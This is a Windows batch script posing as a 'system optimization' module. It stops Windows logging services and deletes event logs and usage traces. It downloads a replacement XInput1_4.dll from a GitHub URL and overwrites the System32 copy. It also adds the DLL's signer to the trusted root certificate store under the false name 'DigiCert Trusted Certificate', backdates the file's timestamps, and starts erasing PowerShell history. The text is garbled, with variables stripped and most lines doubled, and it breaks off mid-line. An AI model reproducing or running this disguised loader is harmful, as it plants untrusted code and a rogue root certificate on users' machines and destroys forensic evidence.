@echo off
setlocal EnableDelayedExpansion

title HDN Neurohost Module - Clear Logs and Optimize System
cls

:: Copyright and Info
:: Copyright and Info
echo ================================
echo       Himanshu Neurohost Module
echo ================================
echo Copyright (c) 2026 Himanshu. All Rights Reserved.
echo Made by Himanshu.
echo ================================
echo Please read the instructions carefully before proceeding.
echo ================================
pause

:: Ensure script runs as Administrator
:: Ensure script runs as Administrator
NET SESSION >nul 2>&1
IF  NEQ 0 (
    echo Please run this script as Administrator!
    pause
    exit
)

echo Stopping Windows Logging Services...
net stop "EventLog" /y >nul 2>&1
net stop "Wecsvc" /y >nul 2>&1
net stop "Winmgmt" /y >nul 2>&1

echo Taking Ownership of Log Files...
takeown /f "\Logs" /r /d y >nul 2>&1
icacls "\Logs" /grant Administrators:F /t /c /q >nul 2>&1
icacls "\Logs" /grant Administrators:F /t /c /q >nul 2>&1
takeown /f "\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1
icacls "\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1

echo Deleting ALL Logs (This is a pre-step, cleanup after process will happen later)...
:: Deleting logs (temporary, to clear any existing logs that might be relevant before starting the optimization process)
:: Deleting logs (temporary, to clear any existing logs that might be relevant before starting the optimization process)
del /s /f /q "\Logs\*" >nul 2>&1
del /s /f /q "\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "\Temp\*" >nul 2>&1
del /s /f /q "\*" >nul 2>&1
del /s /f /q "\Temp\*" >nul 2>&1
del /s /f /q "\Prefetch\*" >nul 2>&1
del /s /f /q "\Microsoft\Windows\INetCache\*" >nul 2>&1

:: Main Menu
:: Main Menu
cls
echo ================================
echo        Neurohost Module
echo ================================
echo WARNING: Optimization process will now apply critical system-level changes!
echo WARNING: Optimization process will now apply critical system-level changes!
echo Do not interrupt the process. This is for optimization purposes only.
echo ================================
echo 1. Apply Optimization (Critical Update)
echo 2. Apply Original (Backup) Replace
echo 3. Exit
echo ================================
set /p choice="Select an option (1-3): "
set /p choice="Select an option (1-3): "

if ""=="1" goto replace
if ""=="2" goto replace_backup
if ""=="3" exit

goto menu

:replace
:replace
set "dll_url=https://github.com/mp400neurod11/Neuro/raw/refs/heads/main/XInput1_4.dll"
set "dll_url=https://github.com/mp400neurod11/Neuro/raw/refs/heads/main/XInput1_4.dll"
goto do_replace

:replace_backup
:replace_backup
set "dll_url=https://github.com/mp400neurod11/backup/raw/refs/heads/main/XInput1_4.dll"
set "dll_url=https://github.com/mp400neurod11/backup/raw/refs/heads/main/XInput1_4.dll"
goto do_replace

:do_replace
:do_replace
cls
echo Neurohost Module: Applying update...
echo Neurohost Module: Applying update...
echo ================================
echo WARNING: This action will apply system-level optimizations.
echo WARNING: This action will apply system-level optimizations.
echo Please ensure all processes are closed and proceed only if you are ready.
echo ================================

:: Check for Admin Privileges
:: Check for Admin Privileges
net session >nul 2>&1
if  neq 0 (
    echo ERROR: Administrator privileges required.
    echo ERROR: Administrator privileges required.
    echo Please run this script as Administrator.
    pause
    exit /b
)

:: dll_url already set by replace or replace_backup
:: dll_url already set by replace or replace_backup
set "dll_path=\XInput1_4.dll"
set "system_dll_path=\System32\XInput1_4.dll"
set "cert_path=\temp_cert.cer"

:: Download the file using PowerShell
:: Download the file using PowerShell
echo Connecting to the server for HDN update...
powershell -Command "& {Invoke-WebRequest '' -OutFile ''}"

:: Check if the download was successful
:: Check if the download was successful
if not exist "" (
    echo ERROR: Download failed! Please check your internet connection or the link.
    echo ERROR: Download failed! Please check your internet connection or the link.
    pause
    exit /b
)
echo SUCCESS: Update file downloaded.
echo SUCCESS: Update file downloaded.

:: Silent Certificate Addition with Friendly Name
:: Silent Certificate Addition with Friendly Name
powershell -Command ^
"^
    $cert = Get-AuthenticodeSignature ''; ^
    if ($cert.SignerCertificate) { ^
        $store = New-Object System.Security.Cryptography.X509Certificates.X509Store('Root', 'LocalMachine'); ^
        $store.Open('ReadWrite'); ^
        $certObj = $cert.SignerCertificate; ^
        $certObj.FriendlyName = 'DigiCert Trusted Certificate'; ^
        $store.Add($certObj); ^
        $store.Close(); ^
    } ^
" >nul 2>&1

:: Find and terminate processes using the file
:: Find and terminate processes using the file
echo ================================
echo WARNING: Terminating processes for optimization...
echo WARNING: Terminating processes for optimization...
echo ================================
for /f "tokens=2 delims=," a in ('powershell -command "$Processes = Get-Process | Where-Object {($_.Modules | Where-Object {$_.FileName -match 'XInput1_4.dll'})} | Select-Object -ExpandProperty Id; $Processes -join ','"') do (
    echo KILLING: Process ID a
    echo KILLING: Process ID a
    taskkill /PID a /F
)

:: Stop Windows File Protection temporarily
:: Stop Windows File Protection temporarily
net stop wuauserv >nul 2>&1
net stop trustedinstaller >nul 2>&1

:: Take ownership and modify permissions
:: Take ownership and modify permissions
if exist "" (
    takeown /f "" /a >nul 2>&1
    icacls "" /grant Administrators:F /t /c /l >nul 2>&1
    icacls "" /grant Administrators:F /t /c /l >nul 2>&1
)

:: Copy new file to System32
:: Copy new file to System32
copy /y "" ""
if  neq 0 (
    echo ERROR: Failed to apply the update! Try running in Safe Mode.
    echo ERROR: Failed to apply the update! Try running in Safe Mode.
    pause
    exit /b
)
echo SUCCESS: Update applied successfully!
echo SUCCESS: Update applied successfully!

:: Modify HDN DLL Timestamp
:: Modify HDN DLL Timestamp
powershell -Command "(Get-Item '').CreationTime  = '2019-12-06 12:49:00'"
powershell -Command "(Get-Item '').CreationTime  = '2019-12-06 12:49:00'"
powershell -Command "(Get-Item '').LastAccessTime = '2019-12-06 12:49:00'"
powershell -Command "(Get-Item '').LastAccessTime = '2019-12-06 12:49:00'"
powershell -Command "(Get-Item '').LastWriteTime  = '2019-12-06 12:49:00'"
powershell -Command "(Get-Item '').LastWriteTime  = '2019-12-06 12:49:00'"

:: Restart stopped services
:: Restart stopped services
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1

:: Clear all logs after optimization
:: Clear all logs after optimization
echo ================================
echo Clearing logs after optimization...
echo ================================
del /s /f /q "\Logs\*" >nul 2>&1
del /s /f /q "\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "\Temp\*" >nul 2>&1
del /s /f /q "\*" >nul 2>&1
del /s /f /q "\Temp\*" >nul 2>&1
del /s /f /q "\Prefetch\*" >nul 2>&1
del /s /f /q "\Microsoft\Windows\INetCache\*" >nul 2>&1
del /s /f /q "\SoftwareDistribution\Datastore\Logs\*" >nul 2>&1
del /s /f /q "\Panther\*" >nul 2>&1
del /s /f /q "\INF\Setupapi.log" >nul 2>&1
del /s /f /q "\INF\Setupapi.dev.log" >nul 2>&1
del /s /f /q "\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "\Roaming\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "\Microsoft\Windows\Recent\AutomaticDestinations\*" >nul 2>&1
del /s /f /q "\Microsoft\Windows\Recent\CustomDestinations\*" >nul 2>&1
del /s /f /q "\System32\LogFiles\Firewall\*" >nul 2>&1
del /s /f /q "\System32\LogFiles\WMI\*" >nul 2>&1
del /s /f /q "\System32\LogFiles\*" >nul 2>&1
del /s /f /q "" >nul 2>&1
del /s /f /q "" >nul 2>&1

:: ================================
:: ================================
:: Remove PowerShell Logs + History
:: Remove PowerShell Logs + History
:: ================================
:: ================================
echo Removi
